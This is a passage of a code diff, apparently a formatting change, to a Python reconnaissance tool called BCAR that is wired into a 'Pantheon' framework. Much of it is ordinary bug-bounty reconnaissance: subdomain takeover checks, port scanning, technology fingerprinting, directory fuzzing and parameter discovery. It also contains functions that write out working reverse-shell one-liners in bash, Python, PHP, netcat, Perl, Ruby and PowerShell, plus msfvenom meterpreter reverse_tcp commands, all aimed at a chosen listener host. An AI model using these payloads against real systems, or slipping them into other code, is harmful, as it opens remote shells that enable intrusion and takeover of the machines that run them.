self.session.get(\n+                    f\"http://{subdomain}\", timeout=10, allow_redirects=True\n+                )\n                 content = response.text.lower()\n-                \n+\n                 for service, signatures in takeover_signatures.items():\n                     if service in subdomain:\n                         for sig in signatures:\n                             if sig.lower() in content:\n                                 return {\n-                                    'subdomain': subdomain,\n-                                    'service': service,\n-                                    'signature': sig,\n-                                    'status_code': response.status_code,\n-                                    'vulnerable': True,\n-                                    'confidence': 'HIGH'\n+                                    \"subdomain\": subdomain,\n+                                    \"service\": service,\n+                                    \"signature\": sig,\n+                                    \"status_code\": response.status_code,\n+                                    \"vulnerable\": True,\n+                                    \"confidence\": \"HIGH\",\n                                 }\n             except Exception as e:\n                 self.logger.debug(f\"Takeover check failed for {subdomain}: {e}\")\n             return None\n-        \n+\n         with ThreadPoolExecutor(max_workers=20) as executor:\n             futures = {executor.submit(check_takeover, sub): sub for sub in subdomains}\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n                     vulnerabilities.append(result)\n-                    \n+\n         self.vulnerabilities.extend(vulnerabilities)\n         return vulnerabilities\n \n-    def advanced_port_scanning(self, targets: List[str], ports: List[int] = None) -> Dict[str, List[int]]:\n+    def advanced_port_scanning(\n+        self, targets: List[str], ports: List[int] = None\n+    ) -> Dict[str, List[int]]:\n         \"\"\"Advanced port scanning with service detection\"\"\"\n         if not ports:\n-            ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]\n-        \n+            ports = [\n+                21,\n+                22,\n+                23,\n+                25,\n+                53,\n+                80,\n+                110,\n+                443,\n+                993,\n+                995,\n+                1723,\n+                3306,\n+                3389,\n+                5432,\n+                5900,\n+                8080,\n+                8443,\n+            ]\n+\n         open_ports = {}\n-        \n+\n         def scan_port(target, port):\n             try:\n                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                 sock.settimeout(3)\n                 result = sock.connect_ex((target, port))\n                 sock.close()\n                 return port if result == 0 else None\n             except Exception:\n                 return None\n-        \n+\n         for target in targets:\n             self.logger.info(f\"Port scanning: {target}\")\n             target_ports = []\n-            \n+\n             with ThreadPoolExecutor(max_workers=100) as executor:\n-                futures = {executor.submit(scan_port, target, port): port for port in ports}\n+                futures = {\n+                    executor.submit(scan_port, target, port): port for port in ports\n+                }\n                 for future in as_completed(futures):\n                     result = future.result()\n                     if result:\n                         target_ports.append(result)\n-            \n+\n             if target_ports:\n                 open_ports[target] = sorted(target_ports)\n-                \n+\n         return open_ports\n \n     def web_technology_detection(self, urls: List[str]) -> Dict[str, Dict[str, Any]]:\n         \"\"\"Detect web technologies and frameworks\"\"\"\n         technology_patterns = {\n-            'Apache': [r'Server: Apache', r'apache'],\n-            'Nginx': [r'Server: nginx', r'nginx'],\n-            'IIS': [r'Server: Microsoft-IIS', r'X-Powered-By: ASP.NET'],\n-            'PHP': [r'X-Powered-By: PHP', r'\\.php'],\n-            'ASP.NET': [r'X-Powered-By: ASP.NET', r'aspnet'],\n-            'WordPress': [r'wp-content', r'wp-includes'],\n-            'Drupal': [r'sites/default', r'drupal'],\n-            'Joomla': [r'administrator/index.php', r'joomla'],\n-            'jQuery': [r'jquery'],\n-            'Bootstrap': [r'bootstrap'],\n-            'React': [r'react', r'_react'],\n-            'Angular': [r'angular', r'ng-'],\n-            'Vue.js': [r'vue\\.js', r'__vue__']\n-        }\n-        \n+            \"Apache\": [r\"Server: Apache\", r\"apache\"],\n+            \"Nginx\": [r\"Server: nginx\", r\"nginx\"],\n+            \"IIS\": [r\"Server: Microsoft-IIS\", r\"X-Powered-By: ASP.NET\"],\n+            \"PHP\": [r\"X-Powered-By: PHP\", r\"\\.php\"],\n+            \"ASP.NET\": [r\"X-Powered-By: ASP.NET\", r\"aspnet\"],\n+            \"WordPress\": [r\"wp-content\", r\"wp-includes\"],\n+            \"Drupal\": [r\"sites/default\", r\"drupal\"],\n+            \"Joomla\": [r\"administrator/index.php\", r\"joomla\"],\n+            \"jQuery\": [r\"jquery\"],\n+            \"Bootstrap\": [r\"bootstrap\"],\n+            \"React\": [r\"react\", r\"_react\"],\n+            \"Angular\": [r\"angular\", r\"ng-\"],\n+            \"Vue.js\": [r\"vue\\.js\", r\"__vue__\"],\n+        }\n+\n         results = {}\n-        \n+\n         def analyze_url(url):\n             try:\n                 response = self.session.get(url, timeout=10)\n                 headers = str(response.headers)\n                 content = response.text\n-                \n+\n                 technologies = {}\n                 for tech, patterns in technology_patterns.items():\n                     for pattern in patterns:\n                         if re.search(pattern, headers + content, re.IGNORECASE):\n-                            technologies[tech] = {'detected': True, 'confidence': 'medium'}\n+                            technologies[tech] = {\n+                                \"detected\": True,\n+                                \"confidence\": \"medium\",\n+                            }\n                             break\n-                \n+\n                 return {\n-                    'url': url,\n-                    'status_code': response.status_code,\n-                    'technologies': technologies,\n-                    'server': response.headers.get('Server', 'Unknown'),\n-                    'title': self._extract_title(content)\n+                    \"url\": url,\n+                    \"status_code\": response.status_code,\n+                    \"technologies\": technologies,\n+                    \"server\": response.headers.get(\"Server\", \"Unknown\"),\n+                    \"title\": self._extract_title(content),\n                 }\n             except Exception as e:\n                 self.logger.debug(f\"Technology detection failed for {url}: {e}\")\n                 return None\n-        \n+\n         with ThreadPoolExecutor(max_workers=20) as executor:\n             futures = {executor.submit(analyze_url, url): url for url in urls}\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n-                    results[result['url']] = result\n-                    \n+                    results[result[\"url\"]] = result\n+\n         return results\n \n-    def advanced_fuzzing(self, base_url: str, wordlist: List[str] = None, extensions: List[str] = None) -> List[Dict[str, Any]]:\n+    def advanced_fuzzing(\n+        self, base_url: str, wordlist: List[str] = None, extensions: List[str] = None\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Advanced directory and parameter fuzzing\"\"\"\n         if not wordlist:\n             wordlist = self._get_default_fuzzing_wordlist()\n         if not extensions:\n-            extensions = ['', '.php', '.asp', '.aspx', '.jsp', '.html', '.txt', '.bak', '.old']\n-        \n+            extensions = [\n+                \"\",\n+                \".php\",\n+                \".asp\",\n+                \".aspx\",\n+                \".jsp\",\n+                \".html\",\n+                \".txt\",\n+                \".bak\",\n+                \".old\",\n+            ]\n+\n         findings = []\n         interesting_codes = [200, 301, 302, 403, 500]\n-        \n+\n         def fuzz_path(path, ext):\n             url = urljoin(base_url, f\"{path}{ext}\")\n             try:\n                 response = self.session.get(url, timeout=5, allow_redirects=False)\n                 if response.status_code in interesting_codes:\n                     return {\n-                        'url': url,\n-                        'status_code': response.status_code,\n-                        'content_length': len(response.content),\n-                        'content_type': response.headers.get('content-type', ''),\n-                        'title': self._extract_title(response.text) if response.status_code == 200 else None\n+                        \"url\": url,\n+                        \"status_code\": response.status_code,\n+                        \"content_length\": len(response.content),\n+                        \"content_type\": response.headers.get(\"content-type\", \"\"),\n+                        \"title\": (\n+                            self._extract_title(response.text)\n+                            if response.status_code == 200\n+                            else None\n+                        ),\n                     }\n             except Exception as e:\n                 self.logger.debug(f\"Fuzzing failed for {url}: {e}\")\n             return None\n-        \n+\n         with ThreadPoolExecutor(max_workers=30) as executor:\n             futures = []\n             for word in wordlist:\n                 for ext in extensions:\n                     futures.append(executor.submit(fuzz_path, word, ext))\n-            \n+\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n                     findings.append(result)\n-        \n+\n         return findings\n \n-    def parameter_discovery(self, url: str, method: str = 'GET') -> List[Dict[str, Any]]:\n+    def parameter_discovery(\n+        self, url: str, method: str = \"GET\"\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Discover hidden parameters using various techniques\"\"\"\n         common_params = [\n-            'id', 'user', 'account', 'number', 'order', 'no', 'doc', 'key', 'email', 'group', 'profile',\n-            'edit', 'report', 'debug', 'test', 'demo', 'admin', 'root', 'password', 'pass', 'passwd',\n-            'token', 'secret', 'api_key', 'access_token', 'auth', 'login', 'logout', 'redirect',\n-            'callback', 'return', 'url', 'link', 'src', 'file', 'path', 'dir', 'folder', 'page',\n-            'view', 'cat', 'action', 'cmd', 'exec', 'system', 'shell', 'query', 'search', 'q'\n+            \"id\",\n+            \"user\",\n+            \"account\",\n+            \"number\",\n+            \"order\",\n+            \"no\",\n+            \"doc\",\n+            \"key\",\n+            \"email\",\n+            \"group\",\n+            \"profile\",\n+            \"edit\",\n+            \"report\",\n+            \"debug\",\n+            \"test\",\n+            \"demo\",\n+            \"admin\",\n+            \"root\",\n+            \"password\",\n+            \"pass\",\n+            \"passwd\",\n+            \"token\",\n+            \"secret\",\n+            \"api_key\",\n+            \"access_token\",\n+            \"auth\",\n+            \"login\",\n+            \"logout\",\n+            \"redirect\",\n+            \"callback\",\n+            \"return\",\n+            \"url\",\n+            \"link\",\n+            \"src\",\n+            \"file\",\n+            \"path\",\n+            \"dir\",\n+            \"folder\",\n+            \"page\",\n+            \"view\",\n+            \"cat\",\n+            \"action\",\n+            \"cmd\",\n+            \"exec\",\n+            \"system\",\n+            \"shell\",\n+            \"query\",\n+            \"search\",\n+            \"q\",\n         ]\n-        \n+\n         found_params = []\n-        \n+\n         def test_parameter(param):\n             try:\n-                if method.upper() == 'GET':\n+                if method.upper() == \"GET\":\n                     test_url = f\"{url}?{param}=test\"\n                     response = self.session.get(test_url, timeout=5)\n                 else:\n-                    response = self.session.post(url, data={param: 'test'}, timeout=5)\n-                \n+                    response = self.session.post(url, data={param: \"test\"}, timeout=5)\n+\n                 # Check for parameter reflection or different response\n-                if 'test' in response.text or response.status_code != 200:\n+                if \"test\" in response.text or response.status_code != 200:\n                     return {\n-                        'parameter': param,\n-                        'method': method,\n-                        'reflected': 'test' in response.text,\n-                        'status_code': response.status_code\n+                        \"parameter\": param,\n+                        \"method\": method,\n+                        \"reflected\": \"test\" in response.text,\n+                        \"status_code\": response.status_code,\n                     }\n             except Exception as e:\n                 self.logger.debug(f\"Parameter test failed for {param}: {e}\")\n             return None\n-        \n+\n         with ThreadPoolExecutor(max_workers=20) as executor:\n-            futures = {executor.submit(test_parameter, param): param for param in common_params}\n+            futures = {\n+                executor.submit(test_parameter, param): param for param in common_params\n+            }\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n                     found_params.append(result)\n-        \n+\n         return found_params\n \n     def generate_reverse_shell_payloads(self, lhost: str, lport: int) -> Dict[str, str]:\n         \"\"\"Generate various reverse shell payloads\"\"\"\n         payloads = {\n-            'bash': f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\",\n-            'python': f\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"{lhost}\\\\\\\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"]);'\",\n-            'php': f\"php -r '$sock=fsockopen(\\\\\\\"{lhost}\\\\\\\",{lport});exec(\\\\\\\"/bin/sh -i <&3 >&3 2>&3\\\\\\\");'\",\n-            'nc': f\"nc -e /bin/sh {lhost} {lport}\",\n-            'perl': f\"perl -e 'use Socket;$i=\\\\\\\"{lhost}\\\\\\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\\"tcp\\\\\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\\\\\\">&S\\\\\\\");open(STDOUT,\\\\\\\">&S\\\\\\\");open(STDERR,\\\\\\\">&S\\\\\\\");exec(\\\\\\\"/bin/sh -i\\\\\\\");}};'\",\n-            'ruby': f\"ruby -rsocket -e'f=TCPSocket.open(\\\\\\\"{lhost}\\\\\\\",{lport}).to_i;exec sprintf(\\\\\\\"/bin/sh -i <&%d >&%d 2>&%d\\\\\\\",f,f,f)'\",\n-            'powershell': f\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\\\\\\\"{lhost}\\\\\\\",{lport})\"\n-        }\n-        \n+            \"bash\": f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\",\n+            \"python\": f'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\"{lhost}\\\\\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\\"/bin/sh\\\\\",\\\\\"-i\\\\\"]);\\'',\n+            \"php\": f'php -r \\'$sock=fsockopen(\\\\\"{lhost}\\\\\",{lport});exec(\\\\\"/bin/sh -i <&3 >&3 2>&3\\\\\");\\'',\n+            \"nc\": f\"nc -e /bin/sh {lhost} {lport}\",\n+            \"perl\": f'perl -e \\'use Socket;$i=\\\\\"{lhost}\\\\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\"tcp\\\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\\\\">&S\\\\\");open(STDOUT,\\\\\">&S\\\\\");open(STDERR,\\\\\">&S\\\\\");exec(\\\\\"/bin/sh -i\\\\\");}};\\'',\n+            \"ruby\": f'ruby -rsocket -e\\'f=TCPSocket.open(\\\\\"{lhost}\\\\\",{lport}).to_i;exec sprintf(\\\\\"/bin/sh -i <&%d >&%d 2>&%d\\\\\",f,f,f)\\'',\n+            \"powershell\": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\\\\\"{lhost}\\\\\",{lport})',\n+        }\n+\n         # URL encoded versions\n         encoded_payloads = {}\n         for name, payload in payloads.items():\n             try:\n                 encoded_payloads[f\"{name}_url_encoded\"] = requests.utils.quote(payload)\n             except Exception:\n                 # Skip encoding if it fails\n                 pass\n-        \n+\n         payloads.update(encoded_payloads)\n         return payloads\n \n     def _get_default_subdomain_wordlist(self) -> List[str]:\n         \"\"\"Get default subdomain wordlist\"\"\"\n         return [\n-            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2',\n-            'cpanel', 'whm', 'autodiscover', 'autoconfig', 'ns', 'm', 'imap', 'test', 'ns3',\n-            'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns4', 'email',\n-            'winmail', 'com', 'mail2', 'cs', 'mx', 'ww1', 'webmail2', 'post', 'web', 'www1',\n-            'dir', 'connect', 'ww42', 'wiki', 'gateway', 'demo', 'api', 'cdn', 'media', 'static',\n-            'assets', 'images', 'img', 'css', 'js', 'app', 'mobile', 'support', 'help', 'docs',\n-            'beta', 'alpha', 'stage', 'staging', 'prod', 'production', 'git', 'svn', 'backup',\n-            'old', 'new', 'shop', 'store', 'secure', 'ssl', 'login', 'dashboard', 'panel'\n+            \"www\",\n+            \"mail\",\n+            \"ftp\",\n+            \"localhost\",\n+            \"webmail\",\n+            \"smtp\",\n+            \"pop\",\n+            \"ns1\",\n+            \"webdisk\",\n+            \"ns2\",\n+            \"cpanel\",\n+            \"whm\",\n+            \"autodiscover\",\n+            \"autoconfig\",\n+            \"ns\",\n+            \"m\",\n+            \"imap\",\n+            \"test\",\n+            \"ns3\",\n+            \"blog\",\n+            \"pop3\",\n+            \"dev\",\n+            \"www2\",\n+            \"admin\",\n+            \"forum\",\n+            \"news\",\n+            \"vpn\",\n+            \"ns4\",\n+            \"email\",\n+            \"winmail\",\n+            \"com\",\n+            \"mail2\",\n+            \"cs\",\n+            \"mx\",\n+            \"ww1\",\n+            \"webmail2\",\n+            \"post\",\n+            \"web\",\n+            \"www1\",\n+            \"dir\",\n+            \"connect\",\n+            \"ww42\",\n+            \"wiki\",\n+            \"gateway\",\n+            \"demo\",\n+            \"api\",\n+            \"cdn\",\n+            \"media\",\n+            \"static\",\n+            \"assets\",\n+            \"images\",\n+            \"img\",\n+            \"css\",\n+            \"js\",\n+            \"app\",\n+            \"mobile\",\n+            \"support\",\n+            \"help\",\n+            \"docs\",\n+            \"beta\",\n+            \"alpha\",\n+            \"stage\",\n+            \"staging\",\n+            \"prod\",\n+            \"production\",\n+            \"git\",\n+            \"svn\",\n+            \"backup\",\n+            \"old\",\n+            \"new\",\n+            \"shop\",\n+            \"store\",\n+            \"secure\",\n+            \"ssl\",\n+            \"login\",\n+            \"dashboard\",\n+            \"panel\",\n         ]\n \n     def _get_default_fuzzing_wordlist(self) -> List[str]:\n         \"\"\"Get default directory fuzzing wordlist\"\"\"\n         return [\n-            'admin', 'administrator', 'login', 'test', 'demo', 'backup', 'old', 'new', 'temp',\n-            'tmp', 'config', 'conf', 'cfg', 'settings', 'setup', 'install', 'db', 'database',\n-            'sql', 'logs', 'log', 'debug', 'dev', 'development', 'prod', 'production', 'staging',\n-            'assets', 'static', 'public', 'private', 'secure', 'protected', 'restricted', 'hidden',\n-            'secret', 'internal', 'system', 'sys', 'root', 'www', 'home', 'user', 'users',\n-            'account', 'accounts', 'profile', 'profiles', 'member', 'members', 'client', 'clients',\n-            'customer', 'customers', 'guest', 'guests', 'upload', 'uploads', 'download', 'downloads',\n-            'file', 'files', 'doc', 'docs', 'document', 'documents', 'pdf', 'image', 'images',\n-            'img', 'pic', 'pics', 'photo', 'photos', 'video', 'videos', 'audio', 'media',\n-            'css', 'js', 'script', 'scripts', 'style', 'styles', 'font', 'fonts', 'inc', 'include',\n-            'lib', 'library', 'class', 'classes', 'function', 'functions', 'api', 'service',\n-            'services', 'web', 'site', 'sites', 'page', 'pages', 'content', 'data', 'cache'\n+            \"admin\",\n+            \"administrator\",\n+            \"login\",\n+            \"test\",\n+            \"demo\",\n+            \"backup\",\n+            \"old\",\n+            \"new\",\n+            \"temp\",\n+            \"tmp\",\n+            \"config\",\n+            \"conf\",\n+            \"cfg\",\n+            \"settings\",\n+            \"setup\",\n+            \"install\",\n+            \"db\",\n+            \"database\",\n+            \"sql\",\n+            \"logs\",\n+            \"log\",\n+            \"debug\",\n+            \"dev\",\n+            \"development\",\n+            \"prod\",\n+            \"production\",\n+            \"staging\",\n+            \"assets\",\n+            \"static\",\n+            \"public\",\n+            \"private\",\n+            \"secure\",\n+            \"protected\",\n+            \"restricted\",\n+            \"hidden\",\n+            \"secret\",\n+            \"internal\",\n+            \"system\",\n+            \"sys\",\n+            \"root\",\n+            \"www\",\n+            \"home\",\n+            \"user\",\n+            \"users\",\n+            \"account\",\n+            \"accounts\",\n+            \"profile\",\n+            \"profiles\",\n+            \"member\",\n+            \"members\",\n+            \"client\",\n+            \"clients\",\n+            \"customer\",\n+            \"customers\",\n+            \"guest\",\n+            \"guests\",\n+            \"upload\",\n+            \"uploads\",\n+            \"download\",\n+            \"downloads\",\n+            \"file\",\n+            \"files\",\n+            \"doc\",\n+            \"docs\",\n+            \"document\",\n+            \"documents\",\n+            \"pdf\",\n+            \"image\",\n+            \"images\",\n+            \"img\",\n+            \"pic\",\n+            \"pics\",\n+            \"photo\",\n+            \"photos\",\n+            \"video\",\n+            \"videos\",\n+            \"audio\",\n+            \"media\",\n+            \"css\",\n+            \"js\",\n+            \"script\",\n+            \"scripts\",\n+            \"style\",\n+            \"styles\",\n+            \"font\",\n+            \"fonts\",\n+            \"inc\",\n+            \"include\",\n+            \"lib\",\n+            \"library\",\n+            \"class\",\n+            \"classes\",\n+            \"function\",\n+            \"functions\",\n+            \"api\",\n+            \"service\",\n+            \"services\",\n+            \"web\",\n+            \"site\",\n+            \"sites\",\n+            \"page\",\n+            \"pages\",\n+            \"content\",\n+            \"data\",\n+            \"cache\",\n         ]\n \n     def _extract_title(self, html: str) -> Optional[str]:\n         \"\"\"Extract title from HTML content\"\"\"\n         try:\n-            match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)\n+            match = re.search(r\"<title[^>]*>([^<]+)</title>\", html, re.IGNORECASE)\n             return match.group(1).strip() if match else None\n         except Exception:\n             return None\n \n-    def run_comprehensive_scan(self, domain: str, config: Dict[str, Any] = None) -> Dict[str, Any]:\n+    def run_comprehensive_scan(\n+        self, domain: str, config: Dict[str, Any] = None\n+    ) -> Dict[str, Any]:\n         \"\"\"Run comprehensive BCAR scan\"\"\"\n         if not config:\n             config = {\n-                'ct_search': True,\n-                'subdomain_enum': True,\n-                'takeover_check': True,\n-                'port_scan': True,\n-                'tech_detection': True,\n-                'directory_fuzz': True,\n-                'parameter_discovery': True\n+                \"ct_search\": True,\n+                \"subdomain_enum\": True,\n+                \"takeover_check\": True,\n+                \"port_scan\": True,\n+                \"tech_detection\": True,\n+                \"directory_fuzz\": True,\n+                \"parameter_discovery\": True,\n             }\n-        \n+\n         results = {\n-            'domain': domain,\n-            'scan_time': datetime.now().isoformat(),\n-            'subdomains': [],\n-            'takeover_vulnerabilities': [],\n-            'open_ports': {},\n-            'technologies': {},\n-            'directories': [],\n-            'parameters': []\n-        }\n-        \n+            \"domain\": domain,\n+            \"scan_time\": datetime.now().isoformat(),\n+            \"subdomains\": [],\n+            \"takeover_vulnerabilities\": [],\n+            \"open_ports\": {},\n+            \"technologies\": {},\n+            \"directories\": [],\n+            \"parameters\": [],\n+        }\n+\n         self.logger.info(f\"Starting comprehensive BCAR scan for {domain}\")\n-        \n+\n         # Certificate Transparency Search\n-        if config.get('ct_search', True):\n+        if config.get(\"ct_search\", True):\n             self.logger.info(\"Running Certificate Transparency search...\")\n             ct_subdomains = self.certificate_transparency_search(domain)\n-            results['subdomains'].extend(ct_subdomains)\n-        \n+            results[\"subdomains\"].extend(ct_subdomains)\n+\n         # Subdomain Enumeration\n-        if config.get('subdomain_enum', True):\n+        if config.get(\"subdomain_enum\", True):\n             self.logger.info(\"Running subdomain enumeration...\")\n             enum_subdomains = self.advanced_subdomain_enumeration(domain)\n-            results['subdomains'].extend(enum_subdomains)\n-        \n+            results[\"subdomains\"].extend(enum_subdomains)\n+\n         # Remove duplicates\n-        results['subdomains'] = list(set(results['subdomains']))\n-        \n+        results[\"subdomains\"] = list(set(results[\"subdomains\"]))\n+\n         # Subdomain Takeover Check\n-        if config.get('takeover_check', True) and results['subdomains']:\n+        if config.get(\"takeover_check\", True) and results[\"subdomains\"]:\n             self.logger.info(\"Checking for subdomain takeover vulnerabilities...\")\n-            takeover_vulns = self.subdomain_takeover_check(results['subdomains'])\n-            results['takeover_vulnerabilities'] = takeover_vulns\n-        \n+            takeover_vulns = self.subdomain_takeover_check(results[\"subdomains\"])\n+            results[\"takeover_vulnerabilities\"] = takeover_vulns\n+\n         # Port Scanning\n-        if config.get('port_scan', True) and results['subdomains']:\n+        if config.get(\"port_scan\", True) and results[\"subdomains\"]:\n             self.logger.info(\"Running port scans...\")\n-            open_ports = self.advanced_port_scanning(results['subdomains'][:10])  # Limit for demo\n-            results['open_ports'] = open_ports\n-        \n+            open_ports = self.advanced_port_scanning(\n+                results[\"subdomains\"][:10]\n+            )  # Limit for demo\n+            results[\"open_ports\"] = open_ports\n+\n         # Technology Detection\n-        if config.get('tech_detection', True) and results['subdomains']:\n+        if config.get(\"tech_detection\", True) and results[\"subdomains\"]:\n             self.logger.info(\"Detecting web technologies...\")\n-            urls = [f\"http://{sub}\" for sub in results['subdomains'][:5]]  # Limit for demo\n+            urls = [\n+                f\"http://{sub}\" for sub in results[\"subdomains\"][:5]\n+            ]  # Limit for demo\n             technologies = self.web_technology_detection(urls)\n-            results['technologies'] = technologies\n-        \n+            results[\"technologies\"] = technologies\n+\n         # Directory Fuzzing\n-        if config.get('directory_fuzz', True) and results['subdomains']:\n+        if config.get(\"directory_fuzz\", True) and results[\"subdomains\"]:\n             self.logger.info(\"Running directory fuzzing...\")\n-            base_url = f\"http://{results['subdomains'][0]}\" if results['subdomains'] else f\"http://{domain}\"\n-            directories = self.advanced_fuzzing(base_url, wordlist=self._get_default_fuzzing_wordlist()[:50])\n-            results['directories'] = directories\n-        \n+            base_url = (\n+                f\"http://{results['subdomains'][0]}\"\n+                if results[\"subdomains\"]\n+                else f\"http://{domain}\"\n+            )\n+            directories = self.advanced_fuzzing(\n+                base_url, wordlist=self._get_default_fuzzing_wordlist()[:50]\n+            )\n+            results[\"directories\"] = directories\n+\n         # Parameter Discovery\n-        if config.get('parameter_discovery', True) and results['subdomains']:\n+        if config.get(\"parameter_discovery\", True) and results[\"subdomains\"]:\n             self.logger.info(\"Running parameter discovery...\")\n-            test_url = f\"http://{results['subdomains'][0]}\" if results['subdomains'] else f\"http://{domain}\"\n+            test_url = (\n+                f\"http://{results['subdomains'][0]}\"\n+                if results[\"subdomains\"]\n+                else f\"http://{domain}\"\n+            )\n             parameters = self.parameter_discovery(test_url)\n-            results['parameters'] = parameters\n-        \n+            results[\"parameters\"] = parameters\n+\n         self.logger.info(f\"BCAR scan completed for {domain}\")\n         return results\n \n \n # Integration wrapper for Pantheon\n class PantheonBCARIntegration:\n     \"\"\"Integration wrapper for BCAR with Pantheon framework\"\"\"\n-    \n+\n     def __init__(self, pantheon_instance=None):\n         self.pantheon = pantheon_instance\n         self.bcar = BCARCore()\n         self.results_dir = Path(\"bcar_results\")\n         self.results_dir.mkdir(exist_ok=True)\n-    \n-    def integrate_with_pantheon_scan(self, targets: List[str], scan_config: Dict[str, Any] = None) -> Dict[str, Any]:\n+\n+    def integrate_with_pantheon_scan(\n+        self, targets: List[str], scan_config: Dict[str, Any] = None\n+    ) -> Dict[str, Any]:\n         \"\"\"Integrate BCAR functionality with existing Pantheon scan\"\"\"\n         combined_results = {\n-            'bcar_results': {},\n-            'integration_timestamp': datetime.now().isoformat(),\n-            'targets_processed': len(targets)\n-        }\n-        \n+            \"bcar_results\": {},\n+            \"integration_timestamp\": datetime.now().isoformat(),\n+            \"targets_processed\": len(targets),\n+        }\n+\n         for target in targets:\n             domain = urlparse(f\"http://{target}\").netloc or target\n             bcar_results = self.bcar.run_comprehensive_scan(domain, scan_config)\n-            combined_results['bcar_results'][domain] = bcar_results\n-            \n+            combined_results[\"bcar_results\"][domain] = bcar_results\n+\n             # Save individual results\n             result_file = self.results_dir / f\"bcar_{domain}_{int(time.time())}.json\"\n-            with open(result_file, 'w') as f:\n+            with open(result_file, \"w\") as f:\n                 json.dump(bcar_results, f, indent=2)\n-        \n+\n         return combined_results\n-    \n-    def generate_meterpreter_payloads(self, lhost: str, lport: int = 4444) -> Dict[str, str]:\n+\n+    def generate_meterpreter_payloads(\n+        self, lhost: str, lport: int = 4444\n+    ) -> Dict[str, str]:\n         \"\"\"Generate meterpreter-compatible payloads\"\"\"\n         meterpreter_payloads = {\n-            'windows_meterpreter_reverse_tcp': f\"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe\",\n-            'linux_meterpreter_reverse_tcp': f\"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf\",\n-            'php_meterpreter_reverse_tcp': f\"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw\",\n-            'java_meterpreter_reverse_tcp': f\"msfvenom -p java/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f jar\",\n-            'python_meterpreter_reverse_tcp': f\"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f py\"\n-        }\n-        \n+            \"windows_meterpreter_reverse_tcp\": f\"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe\",\n+            \"linux_meterpreter_reverse_tcp\": f\"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf\",\n+            \"php_meterpreter_reverse_tcp\": f\"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw\",\n+            \"java_meterpreter_reverse_tcp\": f\"msfvenom -p java/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f jar\",\n+            \"python_meterpreter_reverse_tcp\": f\"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f py\",\n+        }\n+\n         # Also include basic reverse shells\n         basic_payloads = self.bcar.generate_reverse_shell_payloads(lhost, lport)\n         meterpreter_payloads.update(basic_payloads)\n-        \n+\n         return meterpreter_payloads\n-    \n+\n     def enhanced_reconnaissance(self, domain: str) -> Dict[str, Any]:\n         \"\"\"Enhanced reconnaissance with BCAR integration\"\"\"\n         recon_config = {\n-            'ct_search': True,\n-            'subdomain_enum': True, \n-            'takeover_check': True,\n-            'port_scan': True,\n-            'tech_detection': True,\n-            'directory_fuzz': False,  # Skip intensive fuzzing for quick recon\n-            'parameter_discovery': False\n-        }\n-        \n+            \"ct_search\": True,\n+            \"subdomain_enum\": True,\n+            \"takeover_check\": True,\n+            \"port_scan\": True,\n+            \"tech_detection\": True,\n+            \"directory_fuzz\": False,  # Skip intensive fuzzing for quick recon\n+            \"parameter_discovery\": False,\n+        }\n+\n         return self.bcar.run_comprehensive_scan(domain, recon_config)\n \n \n # CLI interface for standalone usage\n def main():\n     \"\"\"Main CLI interface for BCAR\"\"\"\n     import argparse\n-    \n-    parser = argparse.ArgumentParser(description=\"BCAR - Bug Bounty Certificate Authority Reconnaissance\")\n-    parser.add_argument('domain', help='Target domain to scan')\n-    parser.add_argument('--ct-only', action='store_true', help='Only run Certificate Transparency search')\n-    parser.add_argument('--subdomain-only', action='store_true', help='Only run subdomain enumeration')\n-    parser.add_argument('--takeover-only', action='store_true', help='Only check for subdomain takeover')\n-    parser.add_argument('--output', '-o', help='Output file for results (JSON format)')\n-    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')\n-    \n+\n+    parser = argparse.ArgumentParser(\n+        description=\"BCAR - Bug Bounty Certificate Authority Reconnaissance\"\n+    )\n+    parser.add_argument(\"domain\", help=\"Target domain to scan\")\n+    parser.add_argument(\n+        \"--ct-only\",\n+        action=\"store_true\",\n+        help=\"Only run Certificate Transparency search\",\n+    )\n+    parser.add_argument(\n+        